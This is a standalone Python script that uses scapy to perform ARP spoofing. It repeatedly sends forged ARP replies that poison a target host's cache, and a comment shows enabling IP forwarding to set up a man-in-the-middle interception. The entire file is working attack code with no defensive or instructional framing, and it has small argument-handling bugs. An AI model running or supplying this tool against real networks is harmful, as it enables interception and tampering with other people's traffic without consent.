import sys

from scapy.all import *
from threading import Thread

def generate_packet(spoof_IP, dest_IP, hwsrc=None):
    if hwsrc:
        return ARP(op=2, pdst=dest_IP, psrc=spoof_IP, hwsrc=hwsrc)
    else:
        return ARP(op=2, pdst=dest_IP, psrc=spoof_IP)


def spam_request(spoof_IP, dest_IP, hwsrc=None, time_interval=10):

    while True:
        if hwsrc:
            pkt = generate_packet(spoof_IP, dest_IP, hwsrc)
        else:
            pkt = generate_packet(spoof_IP, dest_IP)
        print(pkt.summary())
        send(pkt, verbose=False)
        time.sleep(time_interval)


def arp_spoof(spoof_IP, dest_IP, hwsrc=None, time_interval=10):
    spam_request(spoof_IP,dest_IP)


#sudo sysctl net.ipv4.ip_forward=1

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print('ERROR: Need a source and destination IP to spoof')
        exit(0)
    else:
        spoof_IP = str(sys.argv[1])
        dest_IP = str(sys.argv[2])
        try:
            thread = Thread(target=arp_spoof, args=(spoof_IP, dest_IP))
            thread.start()
        except Exception as ext:
            print(ext)
            print('Error Spoofing')
